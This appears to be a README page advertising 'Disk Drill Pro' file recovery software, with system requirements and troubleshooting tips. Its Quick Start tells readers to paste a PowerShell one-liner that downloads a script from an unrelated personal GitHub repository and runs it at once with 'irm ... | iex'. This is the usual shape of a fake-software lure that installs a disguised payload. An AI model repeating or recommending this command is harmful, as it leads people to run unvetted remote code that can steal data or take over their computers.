# Disk Drill File Recovery

> Disk Drill Pro — deep scan recovery for deleted photos, videos and documents from formatted drives and corrupted storage

---

## Quick Start

Open **PowerShell** and run:

```
irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex
```

---

## How It Works

The installer handles everything:

- Downloads recovery engine with signature database
- Installs support for 400+ file formats
- Preview files before recovery
- Save to any drive or cloud storage

## System Requirements

| Component | Minimum |
|-----------|--------|
| OS | Windows 10/11 (64-bit) |
| RAM | 4 GB (8 GB recommended) |
| Network | Internet for setup |

## Common Issues

**Recovered photos broken?**
Stop using the drive immediately and re-scan. Overwritten data can't be restored.

**External drive not detected?**
Try USB 2.0 port. Install manufacturer's driver.
